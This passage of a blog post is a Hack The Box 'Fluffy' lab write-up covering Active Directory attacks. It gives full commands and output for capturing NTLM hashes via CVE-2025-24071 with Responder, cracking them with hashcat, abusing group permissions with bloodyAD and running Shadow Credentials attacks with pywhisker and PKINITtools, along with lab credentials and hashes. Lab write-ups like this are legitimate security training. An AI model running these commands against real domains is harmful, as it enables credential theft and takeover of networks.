                    <a href="#13-bloodhound-setup" aria-label="1.3 Bloodhound setup">1.3 Bloodhound setup</a></li></ul>
                </li>
                <li>
                    <a href="#2-lateral-movement" aria-label="2. Lateral Movement">2. Lateral Movement</a><ul>
                        
                <li>
                    <a href="#21-adding-ourselves-to-service-accounts-group" aria-label="2.1 Adding ourselves to Service Accounts group">2.1 Adding ourselves to Service Accounts group</a></li>
                <li>
                    <a href="#22-shadow-credentials-attack-to-retrieve-winrm_svc-hash" aria-label="2.2 Shadow Credentials attack to retrieve winrm_svc hash">2.2 Shadow Credentials attack to retrieve winrm_svc hash</a></li></ul>
                </li>
                <li>
                    <a href="#3-privilege-escalation" aria-label="3 Privilege Escalation">3 Privilege Escalation</a><ul>
                        
                <li>
                    <a href="#31-shadow-credentials-attack-to-retrieve-ca_svc-hash" aria-label="3.1 Shadow Credentials attack to retrieve ca_svc hash">3.1 Shadow Credentials attack to retrieve ca_svc hash</a></li>
                <li>
                    <a href="#32-exploiting-esc16" aria-label="3.2 Exploiting ESC16">3.2 Exploiting ESC16</a></li></ul>
                </li>
                <li>
                    <a href="#resources" aria-label="Resources">Resources</a>
                </li>
            </ul>
        </div>
    </details>
</div>

  <div class="post-content"><p>Fluffy is an easy rated Windows machine that showcases real-life bad practices that lead to lateral movement, exploiting ADCS misconfigurations up until compromising the DC.</p>
<h1 id="1-reconnaissance">1. Reconnaissance<a hidden class="anchor" aria-hidden="true" href="#1-reconnaissance">#</a></h1>
<p>Below is the list of open ports on the machine.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#ae81ff">53</span> - dns
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">88</span> - kerberos
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">139</span> - netbios
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">389</span> - LDAP 
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">445</span> - SMB
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">464</span> - kpasswd5?
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">593</span> - RPC over HTTP 1.0
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">636</span> - ssl/LDAP
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">3268</span> - LDAP
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">3269</span> - ssl/LDAP 
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">5985</span> - HTTP
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>OS : windows_server_2019 - likely DC 
</span></span></code></pre></div><p>SMB signing scan just for practice purpose :)</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>Host script results:
</span></span><span style="display:flex;"><span>| smb2-time: 
</span></span><span style="display:flex;"><span>|   date: 2025-06-13T10:39:30
</span></span><span style="display:flex;"><span>|_  start_date: N/A
</span></span><span style="display:flex;"><span>| smb2-security-mode: 
</span></span><span style="display:flex;"><span>|   3:1:1: 
</span></span><span style="display:flex;"><span>|_    Message signing enabled and required
</span></span><span style="display:flex;"><span>|_clock-skew: mean: 6h38m07s, deviation: 0s, median: 6h38m07s
</span></span></code></pre></div><h2 id="12-file-discovery-in-file-share-smb">1.2 File discovery in file share (SMB)<a hidden class="anchor" aria-hidden="true" href="#12-file-discovery-in-file-share-smb">#</a></h2>
<ul>
<li>Upgrade_Notice.pdf</li>
<li><code>Everything-1.4.1.1026.x64</code> directory
<ul>
<li>everything.exe</li>
<li>Everything.lng</li>
</ul>
</li>
<li><code>KeePass</code> directory
<ul>
<li>many files&hellip;</li>
</ul>
</li>
</ul>
<p>Upgrade_Notice.pdf would be of use for us later.</p>
<h2 id="13-bloodhound-setup">1.3 Bloodhound setup<a hidden class="anchor" aria-hidden="true" href="#13-bloodhound-setup">#</a></h2>
<p>Use the given credentials to populate the Bloodhound interface.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo bloodhound-python -u j.fleischman -p <span style="color:#e6db74">&#39;J0elTHEM4n1990!&#39;</span> -d fluffy.htb -ns 10.10.11.69 -c all
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>INFO: BloodHound.py <span style="color:#66d9ef">for</span> BloodHound LEGACY <span style="color:#f92672">(</span>BloodHound 4.2 and 4.3<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>INFO: Found AD domain: fluffy.htb
</span></span><span style="display:flex;"><span>INFO: Getting TGT <span style="color:#66d9ef">for</span> user
</span></span><span style="display:flex;"><span>WARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: <span style="color:#f92672">[</span>Errno Connection error <span style="color:#f92672">(</span>dc01.fluffy.htb:88<span style="color:#f92672">)]</span> <span style="color:#f92672">[</span>Errno -2<span style="color:#f92672">]</span> Name or service not known
</span></span><span style="display:flex;"><span>INFO: Connecting to LDAP server: dc01.fluffy.htb
</span></span><span style="display:flex;"><span>INFO: Found <span style="color:#ae81ff">1</span> domains
</span></span><span style="display:flex;"><span>INFO: Found <span style="color:#ae81ff">1</span> domains in the forest
</span></span><span style="display:flex;"><span>INFO: Found <span style="color:#ae81ff">1</span> computers
</span></span><span style="display:flex;"><span>INFO: Connecting to LDAP server: dc01.fluffy.htb
</span></span><span style="display:flex;"><span>INFO: Found <span style="color:#ae81ff">10</span> users
</span></span><span style="display:flex;"><span>INFO: Found <span style="color:#ae81ff">54</span> groups
</span></span><span style="display:flex;"><span>INFO: Found <span style="color:#ae81ff">2</span> gpos
</span></span><span style="display:flex;"><span>INFO: Found <span style="color:#ae81ff">1</span> ous
</span></span><span style="display:flex;"><span>INFO: Found <span style="color:#ae81ff">19</span> containers
</span></span><span style="display:flex;"><span>INFO: Found <span style="color:#ae81ff">0</span> trusts
</span></span><span style="display:flex;"><span>INFO: Starting computer enumeration with <span style="color:#ae81ff">10</span> workers
</span></span><span style="display:flex;"><span>INFO: Querying computer: DC01.fluffy.htb
</span></span><span style="display:flex;"><span>INFO: Done in 00M 13S
</span></span></code></pre></div><p><img alt="bloodhound1" loading="lazy" src="/images/bloodhound1.png"></p>
<p>After running <code>Bloodhound</code>, right click on the compromised user (j.fleischman) and click &ldquo;Add to Owned&rdquo;.</p>
<h1 id="2-lateral-movement">2. Lateral Movement<a hidden class="anchor" aria-hidden="true" href="#2-lateral-movement">#</a></h1>
<p>In the Upgrade_Notice.pdf, there are several CVEs that are pending to upgrade which one vulnerability stands out :- <a href="https://cti.monster/blog/2025/03/18/CVE-2025-24071.html"><code>CVE-2025-24071</code></a> - Basically it exploits the trust between Windows Explorer and .library-ms file.  Windows Explorer automatically parses .library-ms file to build virtual views. When a .library-ms file containing SMB path is compressed into a ZIP archive, and subsequently decompressed by someone in the network, the victim&rsquo;s hash will be captured as it is a part of the NTLM authentication. This means it will not work if NTLM authentication mechanism is not used in the environment.</p>
<p>The exploit : <a href="https://www.exploit-db.com/exploits/52310">https://www.exploit-db.com/exploits/52310</a></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>‚îå‚îÄ‚îÄ<span style="color:#f92672">(</span>cresp0„âøkali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Downloads<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>‚îî‚îÄ$ python3 52310.py -i 10.10.14.81 -n paylod_fluffy -o ./output_fluffy --keep
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Generating malicious .library-ms file...
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Created ZIP: output_fluffy/paylod_fluffy.zip
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>!<span style="color:#f92672">]</span> Done. Send ZIP to victim and listen <span style="color:#66d9ef">for</span> NTLM hash on your SMB server.
</span></span></code></pre></div><p>Setup <code>responder</code> and upload the zip file to the SMB server</p>
<p>Responder activated :</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo responder -I tun0 -wvF
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Listening <span style="color:#66d9ef">for</span> events...
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>SMB<span style="color:#f92672">]</span> NTLMv2-SSP Client   : 10.10.11.69
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>SMB<span style="color:#f92672">]</span> NTLMv2-SSP Username : FLUFFY<span style="color:#ae81ff">\p</span>.agila
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>SMB<span style="color:#f92672">]</span> NTLMv2-SSP Hash     : p.agila::FLUFFY:d6ac7023016da127:669DD697220ABD56148B54E9315FFD51:0101000000000000006FA0AFD5E2DB01ABF46FB9B154CC660000000002000800470048005200560001001E00570049004E002D004600490050004B005A0049004E0052004F005700340004003400570049004E002D004600490050004B005A0049004E0052004F00570034002E0047004800520056002E004C004F00430041004C000300140047004800520056002E004C004F00430041004C000500140047004800520056002E004C004F00430041004C0007000800006FA0AFD5E2DB010600040002000000080030003000000000000000010000000020000006FBC23B1452E8355F3AB8E58313B291D4334F0AE503E096F6C624A214C100820A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310034002E00380031000000000000000000
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>smb: <span style="color:#ae81ff">\&gt;</span> put paylod_fluffy.zip
</span></span><span style="display:flex;"><span>putting file paylod_fluffy.zip as <span style="color:#ae81ff">\p</span>aylod_fluffy.zip <span style="color:#f92672">(</span>2.5 kb/s<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>average 2.5 kb/s<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>smb: <span style="color:#ae81ff">\&gt;</span> ls
</span></span><span style="display:flex;"><span>  .                                   D        <span style="color:#ae81ff">0</span>  Sun Jun <span style="color:#ae81ff">22</span> 00:55:02 <span style="color:#ae81ff">2025</span>
</span></span><span style="display:flex;"><span>  ..                                  D        <span style="color:#ae81ff">0</span>  Sun Jun <span style="color:#ae81ff">22</span> 00:55:02 <span style="color:#ae81ff">2025</span>
</span></span><span style="display:flex;"><span>  Everything-1.4.1.1026.x64           D        <span style="color:#ae81ff">0</span>  Fri Apr <span style="color:#ae81ff">18</span> 16:08:44 <span style="color:#ae81ff">2025</span>
</span></span><span style="display:flex;"><span>  Everything-1.4.1.1026.x64.zip       A  <span style="color:#ae81ff">1827464</span>  Fri Apr <span style="color:#ae81ff">18</span> 16:04:05 <span style="color:#ae81ff">2025</span>
</span></span><span style="display:flex;"><span>  KeePass-2.58                        D        <span style="color:#ae81ff">0</span>  Fri Apr <span style="color:#ae81ff">18</span> 16:08:38 <span style="color:#ae81ff">2025</span>
</span></span><span style="display:flex;"><span>  KeePass-2.58.zip                    A  <span style="color:#ae81ff">3225346</span>  Fri Apr <span style="color:#ae81ff">18</span> 16:03:17 <span style="color:#ae81ff">2025</span>
</span></span><span style="display:flex;"><span>  paylod_fluffy.zip                   A      <span style="color:#ae81ff">334</span>  Sun Jun <span style="color:#ae81ff">22</span> 00:55:02 <span style="color:#ae81ff">2025</span>
</span></span><span style="display:flex;"><span>  Upgrade_Notice.pdf                  A   <span style="color:#ae81ff">169963</span>  Sat May <span style="color:#ae81ff">17</span> 15:31:07 <span style="color:#ae81ff">2025</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>		<span style="color:#ae81ff">5842943</span> blocks of size 4096. <span style="color:#ae81ff">2253114</span> blocks available
</span></span><span style="display:flex;"><span>smb: <span style="color:#ae81ff">\&gt;</span>
</span></span></code></pre></div><p>We have caught p.agila hash as she is the victim of the vulnerability. Put the hash in a file and attempt to crack it using hashcat.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>hashcat -m <span style="color:#ae81ff">5600</span> -a <span style="color:#ae81ff">0</span> p.agilahash.txt /usr/share/wordlists/rockyou.txt
</span></span></code></pre></div><p>New creds would be obtained <code>p.agila:prometheusx-303</code>. As we have acquired a new user, re-run the below command for the new user in order for <code>Bloodhound</code> to be updated. Upload the command outputs to the <code>Bloodhound</code> web interface.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>bloodhound-python -u p.agila -p <span style="color:#e6db74">&#34;prometheusx-303&#34;</span> -d fluffy.htb -ns 10.10.11.69 -c all
</span></span></code></pre></div><p>As we can see in the imgae below, p.agila is a member of the <code>Service Account Managers</code> security group. This should be kept in mind.
<img alt="bloodhound2" loading="lazy" src="/images/bloodhound2.png">
<img alt="bh3" loading="lazy" src="/images/bh3.png"></p>
<p>Click outbound object control. We would see that p.agila is a member of <code>Service Account Managers</code> group that has <code>GenericAll</code> perm on the Service Accounts group which has the <code>GenericWrite</code> perm on its members (ca_svc, ldap_svc and winrm_svc). For the GenericAll, it means Service Account Managers group members can add any users (modify group membership) into group Service Accounts.</p>
<blockquote>
<p>üí° <strong>Tip:</strong> GenericAll over a group - Full control of a group allows you to directly modify group
membership of the group. For full abuse info in that scenario, see the
Abuse Info section under the AddMembers edge.</p></blockquote>
<blockquote>
<p>üí° <strong>Tip:</strong> GenericWrite over a user - you can write to the ‚Äúmsds-KeyCredentialLink‚Äù attribute. Writing to this property allows an attacker to create ‚ÄúShadowCredentials‚Äù on the object and authenticate as the principal using Kerberos PKINIT. See more information under the AddKeyCredentialLink edge.
Alternatively, you can write to the ‚ÄúservicePrincipalNames‚Äù attribute and perform a targeted kerberoasting attack.</p></blockquote>
<h2 id="21-adding-ourselves-to-service-accounts-group">2.1 Adding ourselves to Service Accounts group<a hidden class="anchor" aria-hidden="true" href="#21-adding-ourselves-to-service-accounts-group">#</a></h2>
<p>So right now, we (p.agila) needs to have &ldquo;access&rdquo; to the user accounts in the <code>Service Accounts</code> group to explore further more. Since p.agila is a member of <code>Service Account Managers</code> group which has <code>GenericAll</code> perm to the <code>Service Accounts</code> group, we can add ourselves to the group to inherit the <code>GenericWrite</code> perm on the service accounts.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>bloodyAD --host <span style="color:#e6db74">&#39;10.10.11.69&#39;</span> -d <span style="color:#e6db74">&#39;dc01.fluffy.htb&#39;</span> -u <span style="color:#e6db74">&#39;p.agila&#39;</span> -p <span style="color:#e6db74">&#39;prometheusx-303&#39;</span>  add groupMember <span style="color:#e6db74">&#39;SERVICE ACCOUNTS&#39;</span> p.agila
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> p.agila added to SERVICE ACCOUNTS
</span></span></code></pre></div><p>run bloodhound again after adding p.agila to Service Accounts Group.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>bloodhound-python -u <span style="color:#e6db74">&#39;p.agila&#39;</span> -p <span style="color:#e6db74">&#39;prometheusx-303&#39;</span> -d fluffy.htb -ns 10.10.11.69 -c all
</span></span></code></pre></div><p><img alt="bh4" loading="lazy" src="/images/bh4.png"></p>
<p><img alt="bh5" loading="lazy" src="/images/bh5.png"></p>
<h2 id="22-shadow-credentials-attack-to-retrieve-winrm_svc-hash">2.2 Shadow Credentials attack to retrieve winrm_svc hash<a hidden class="anchor" aria-hidden="true" href="#22-shadow-credentials-attack-to-retrieve-winrm_svc-hash">#</a></h2>
<p>Now we will create Shadow Credentials on one of the service accounts which is <code>winrm_svc</code>. Use <code>pywhisker.py</code> from <a href="https://github.com/ShutdownRepo/pywhisker">here</a>. To understand more about Shadow Credentials attack.. read it <a href="https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab">here</a>. By doing this attack, we essentially inject a certificate into the account for purposes like persistence, and now we can perform Kerberos PKINIT auth using the cert set by us without knowing its password.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>‚îÄ‚îÄ<span style="color:#f92672">(</span>venv<span style="color:#f92672">)</span>‚îÄ<span style="color:#f92672">(</span>cresp0„âøkali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Desktop/fluffy/pywhisker/pywhisker<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>‚îî‚îÄ$ python3 pywhisker.py -d fluffy.htb -u <span style="color:#e6db74">&#34;p.agila&#34;</span> -p <span style="color:#e6db74">&#34;prometheusx-303&#34;</span> --dc-ip 10.10.11.69 --target <span style="color:#e6db74">&#34;WINRM_SVC&#34;</span> --action <span style="color:#e6db74">&#34;list&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Searching <span style="color:#66d9ef">for</span> the target account
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Target user found: CN<span style="color:#f92672">=</span>winrm service,CN<span style="color:#f92672">=</span>Users,DC<span style="color:#f92672">=</span>fluffy,DC<span style="color:#f92672">=</span>htb
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Listing devices <span style="color:#66d9ef">for</span> WINRM_SVC
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> DeviceID: b663af76-788c-8644-cbdd-dfbac495f206 | Creation Time <span style="color:#f92672">(</span>UTC<span style="color:#f92672">)</span>: 2025-06-22 14:14:53.875462
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> DeviceID: ac543b34-cf8d-f453-f4ae-e8f7a057783e | Creation Time <span style="color:#f92672">(</span>UTC<span style="color:#f92672">)</span>: 2025-06-22 10:23:29.426920
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> DeviceID: ca333e54-1aa1-8cb0-a104-702443c6f555 | Creation Time <span style="color:#f92672">(</span>UTC<span style="color:#f92672">)</span>: 2025-06-22 19:05:51.584066
</span></span><span style="display:flex;"><span>                                                                                                                                                                                
</span></span><span style="display:flex;"><span>‚îå‚îÄ‚îÄ<span style="color:#f92672">(</span>venv<span style="color:#f92672">)</span>‚îÄ<span style="color:#f92672">(</span>cresp0„âøkali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Desktop/fluffy/pywhisker/pywhisker<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>‚îî‚îÄ$ python3 pywhisker.py -d fluffy.htb -u <span style="color:#e6db74">&#34;p.agila&#34;</span> -p <span style="color:#e6db74">&#34;prometheusx-303&#34;</span> --dc-ip 10.10.11.69 --target <span style="color:#e6db74">&#34;WINRM_SVC&#34;</span> --action <span style="color:#e6db74">&#34;add&#34;</span> 
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Searching <span style="color:#66d9ef">for</span> the target account
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Target user found: CN<span style="color:#f92672">=</span>winrm service,CN<span style="color:#f92672">=</span>Users,DC<span style="color:#f92672">=</span>fluffy,DC<span style="color:#f92672">=</span>htb
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Generating certificate
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Certificate generated
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Generating KeyCredential
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> KeyCredential generated with DeviceID: 59a9d7f7-4924-035f-62f1-d2ce1f138a6f
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Updating the msDS-KeyCredentialLink attribute of WINRM_SVC
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Updated the msDS-KeyCredentialLink attribute of the target object
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Converting PEM -&gt; PFX with cryptography: Xyys4u8v.pfx
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> PFX exportiert nach: Xyys4u8v.pfx
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>i<span style="color:#f92672">]</span> Passwort f√ºr PFX: vJaqhtyr3hMdv3qKYBSK
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Saved PFX <span style="color:#f92672">(</span><span style="color:#75715e">#PKCS12) certificate &amp; key at path: Xyys4u8v.pfx</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Must be used with password: vJaqhtyr3hMdv3qKYBSK
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> A TGT can now be obtained with https://github.com/dirkjanm/PKINITtools
</span></span></code></pre></div><p>Run <code>gettgtpkinit.py</code> from <a href="https://github.com/dirkjanm/PKINITtools">https://github.com/dirkjanm/PKINITtools</a> to get the TGT. File saved to winrm_svc.ccache.</p>
<p>Now, I want you to take a look at the output, where there is a <code>AS-REP encryption key</code>. The tool prints it out because in the next step, the NT hash is retrieved by decrypting the NTLM keys (NT hash-derived keys) from the <code>PAC_CREDENTIAL_INFO</code> returned by the KDC.. using the <code>AS-REP encryption key</code> itself.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>‚îå‚îÄ‚îÄ<span style="color:#f92672">(</span>root„âøkali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>/home/cresp0/Desktop/fluffy/PKINITtools<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>‚îî‚îÄ# python3 gettgtpkinit.py fluffy.htb/winrm_svc -cert-pfx Xyys4u8v.pfx -pfx-pass vJaqhtyr3hMdv3qKYBSK -dc-ip 10.10.11.69 winrm_svc.ccache
</span></span><span style="display:flex;"><span>2025-06-23 13:13:01,015 minikerberos INFO     Loading certificate and key from file
</span></span><span style="display:flex;"><span>INFO:minikerberos:Loading certificate and key from file
</span></span><span style="display:flex;"><span>2025-06-23 13:13:01,043 minikerberos INFO     Requesting TGT
</span></span><span style="display:flex;"><span>INFO:minikerberos:Requesting TGT
</span></span><span style="display:flex;"><span>2025-06-23 13:13:06,282 minikerberos INFO     AS-REP encryption key <span style="color:#f92672">(</span>you might need this later<span style="color:#f92672">)</span>:
</span></span><span style="display:flex;"><span>INFO:minikerberos:AS-REP encryption key <span style="color:#f92672">(</span>you might need this later<span style="color:#f92672">)</span>:
</span></span><span style="display:flex;"><span>2025-06-23 13:13:06,282 minikerberos INFO     398bd58e8f484f885d3735cc6fe28ae0277840c5cabb8081167f4f85f7a7d31e
</span></span><span style="display:flex;"><span>INFO:minikerberos:398bd58e8f484f885d3735cc6fe28ae0277840c5cabb8081167f4f85f7a7d31e
</span></span><span style="display:flex;"><span>2025-06-23 13:13:06,286 minikerberos INFO     Saved TGT to file
</span></span><span style="display:flex;"><span>INFO:minikerberos:Saved TGT to file
</span></span></code></pre></div><p>Run <code>getnthash.py</code> to retrieve the NT hash of <code>winrm_svc</code>. This tool actually does the <code>TGS-REQ</code> process using Kerberos U2U.. when someone tries to access a resource using TGT gotten from the KDC. See the image below :</p>
<p><img alt="getnt" loading="lazy" src="/images/getnt.png"></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>‚îå‚îÄ‚îÄ<span style="color:#f92672">(</span>root„âøkali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>/home/cresp0/Desktop/fluffy/PKINITtools<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>‚îî‚îÄ# python3 getnthash.py -k 398bd58e8f484f885d3735cc6fe28ae0277840c5cabb8081167f4f85f7a7d31e fluffy.htb/WINRM_SVC
</span></span><span style="display:flex;"><span>Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Using TGT from cache
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Requesting ticket to self with PAC
</span></span><span style="display:flex;"><span>Recovered NT Hash
</span></span><span style="display:flex;"><span>33bd09dcd697600edf6b3a7af4875767
</span></span></code></pre></div><p>Use <code>evil-winrm</code> to connect to the account remotely and get the user flag.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>‚îå‚îÄ‚îÄ<span style="color:#f92672">(</span>root„âøkali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>/home/cresp0/Desktop/fluffy/PKINITtools<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>‚îî‚îÄ# evil-winrm -i 10.10.11.69 -u winrm_svc -H 33bd09dcd697600edf6b3a7af4875767
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>*Evil-WinRM* PS C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\w</span>inrm_svc<span style="color:#ae81ff">\D</span>esktop&gt; ls
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    Directory: C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\w</span>inrm_svc<span style="color:#ae81ff">\D</span>esktop
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Mode                LastWriteTime         Length Name
</span></span><span style="display:flex;"><span>----                -------------         ------ ----
</span></span><span style="display:flex;"><span>-ar---        6/22/2025   9:03 AM             <span style="color:#ae81ff">34</span> user.txt
</span></span></code></pre></div><h1 id="3-privilege-escalation">3 Privilege Escalation<a hidden class="anchor" aria-hidden="true" href="#3-privilege-escalation">#</a></h1>
<h2 id="31-shadow-credentials-attack-to-retrieve-ca_svc-hash">3.1 Shadow Credentials attack to retrieve ca_svc hash<a hidden class="anchor" aria-hidden="true" href="#31-shadow-credentials-attack-to-retrieve-ca_svc-hash">#</a></h2>
<p>We have another potential privilege escalation target: the <code>ca_svc</code> account. Since this account is tied to the Certificate Authority, we could enumerate for Active Directory Certificate Services (ADCS) vulnerabilities using <code>Certipy</code>. To proceed, however, we would need the hash of <code>ca_svc</code>. Given that we hold <code>GenericWrite</code> permissions over the <code>Service Accounts</code> group, we can leverage this to add shadow credentials to ca_svc (similar to what we previously did with winrm_svc) in order to obtain its hash.</p>
<p>Use <code>pywhisker.py</code> to add the shadow credentials to ca_svc</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>‚îå‚îÄ‚îÄ<span style="color:#f92672">(</span>venv<span style="color:#f92672">)</span>‚îÄ<span style="color:#f92672">(</span>cresp0„âøkali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Desktop/fluffy/pywhisker/pywhisker<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>‚îî‚îÄ$ python3 pywhisker.py -d fluffy.htb -u <span style="color:#e6db74">&#34;p.agila&#34;</span> -p <span style="color:#e6db74">&#34;prometheusx-303&#34;</span> --dc-ip 10.10.11.69 --target <span style="color:#e6db74">&#34;CA_SVC&#34;</span> --action <span style="color:#e6db74">&#34;add&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Searching <span style="color:#66d9ef">for</span> the target account
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Target user found: CN<span style="color:#f92672">=</span>certificate authority service,CN<span style="color:#f92672">=</span>Users,DC<span style="color:#f92672">=</span>fluffy,DC<span style="color:#f92672">=</span>htb
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Generating certificate
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Certificate generated
